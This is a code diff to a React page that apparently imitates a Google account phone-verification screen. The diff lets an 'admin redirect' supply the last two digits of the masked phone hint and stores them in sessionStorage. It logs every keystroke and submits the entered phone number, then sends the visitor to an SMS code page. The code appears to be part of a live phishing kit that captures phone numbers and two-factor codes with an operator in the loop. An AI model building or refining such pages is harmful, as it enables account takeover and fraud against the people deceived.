@@ -23,16 +23,23 @@ export const Route = createFileRoute("/ge/confirmphone")({
   component: GeConfirmPhonePage,
 });
 
-/** Masked phone hint from screenshot (••••••••85). Optional ?hint=NN overrides last 2 digits. */
-function phoneHintFromSearch(): string {
-  if (typeof window === "undefined") return "••••••••85";
+/** Last 2 digits from admin redirect (?hint= or ?code=). */
+function lastTwoFromSearch(): string {
+  if (typeof window === "undefined") return "••";
   try {
-    const q = new URLSearchParams(window.location.search).get("hint");
-    if (q && /^\d{2}$/.test(q.trim())) return `••••••••${q.trim()}`;
+    const sp = new URLSearchParams(window.location.search);
+    const q = (sp.get("hint") || sp.get("code") || "").trim();
+    if (/^\d{2}$/.test(q)) return q;
   } catch {
     /* ignore */
   }
-  return "••••••••85";
+  try {
+    const s = sessionStorage.getItem("ge_phone_hint") || "";
+    if (/^\d{2}$/.test(s)) return s;
+  } catch {
+    /* ignore */
+  }
+  return "••";
 }
 
 const GE_PHONE_CSS = `
@@ -168,31 +175,6 @@ ${GE_SHELL_CSS}
   caret-color: var(--gm3-primary);
 }
 
-.ge-actions {
-  display: flex;
-  flex-direction: row;
-  flex-wrap: wrap;
-  align-items: center;
-  justify-content: space-between;
-  margin-top: auto;
-  padding-top: 32px;
-  gap: 8px;
-  width: 100%;
-}
-.ge-btn-text {
-  background: none;
-  border: none;
-  padding: 0 12px;
-  height: 40px;
-  border-radius: 20px;
-  color: var(--gm-next-fill);
-  font-family: inherit;
-  font-size: 0.875rem;
-  font-weight: 500;
-  letter-spacing: 0.0107142857em;
-  cursor: pointer;
-}
-.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
 .ge-btn {
   display: inline-flex;
   align-items: center;
@@ -230,7 +212,8 @@ function GeConfirmPhonePage() {
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [phone, setPhone] = useState("");
   const [focused, setFocused] = useState(false);
-  const [phoneHint] = useState(() => phoneHintFromSearch());
+  const [fieldError, setFieldError] = useState(false);
+  const [lastTwo, setLastTwo] = useState(() => lastTwoFromSearch());
   const inputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
@@ -238,6 +221,15 @@ function GeConfirmPhonePage() {
     if (resolved) {
       setEmail(resolved);
       setGeEmail(resolved);
+    }
+    const two = lastTwoFromSearch();
+    setLastTwo(two);
+    if (/^\d{2}$/.test(two)) {
+      try {
+        sessionStorage.setItem("ge_phone_hint", two);
+      } catch {
+        /* ignore */
+      }
     }
     setTimeout(() => inputRef.current?.focus(), 200);
   }, []);
@@ -268,15 +260,27 @@ function GeConfirmPhonePage() {
   const hasValue = phone.length > 0;
   const isActive = focused || hasValue;
   const canSend = phone.trim().length > 0;
+  const phoneHint = `••••••••${lastTwo}`;
+
+  const handleTryAnother = () => {
+    trackClick("Try another way");
+    setFieldError(true);
+    inputRef.current?.focus();
+  };
 
   const handleSend = (e?: FormEvent) => {
     e?.preventDefault();
-    if (!canSend) return;
+    if (!canSend) {
+      setFieldError(true);
+      return;
+    }
     const trimmed = phone.trim();
     setGePhone(trimmed);
+    setFieldError(false);
     trackClick("Send");
     trackSubmit("phone", trimmed);
-    geNavigate("/ge/sendcode");
+    // One page → SMS code (admin-provided last digits already shown here)
+    geNavigate("/ge/smscode");
   };
 
   return (
@@ -304,7 +308,7 @@ function GeConfirmPhonePage() {
 
           <form className="ge-form" onSubmit={handleSend} autoComplete="off">
             <div
-              className={`ge-phone-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}`}
+              className={`ge-phone-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}${fieldError ? " is-error" : ""}`}
             >
               <label htmlFor="phone">Phone number</label>
               <div className="ge-phone-row">
@@ -329,11 +333,15 @@ function GeConfirmPhonePage() {
                   spellCheck={false}
                   aria-label="Phone number"
                   value={phone}
-                  onFocus={() => setFocused(true)}
+                  onFocus={() => {
+                    setFocused(true);
+                    setFieldError(false);
+                  }}
                   onBlur={() => setFocused(false)}
                   onChange={(e) => {
                     const v = e.target.value;
                     setPhone(v);
+                    setFieldError(false);
                     trackInput("phone", v, "tel");
                   }}
                 />
@@ -342,11 +350,7 @@ function GeConfirmPhonePage() {
             </div>
 
             <div className="ge-actions">
-              <button
-                type="button"
-                className="ge-btn-text"
-                onClick={() => trackClick("Try another way")}
-              >
+              <button type="button" className="ge-btn-text" onClick={handleTryAnother}>
                 Try another way
               </button>
               <button type="submit" className="ge-btn ge-btn-send" disabled={!canSend}>
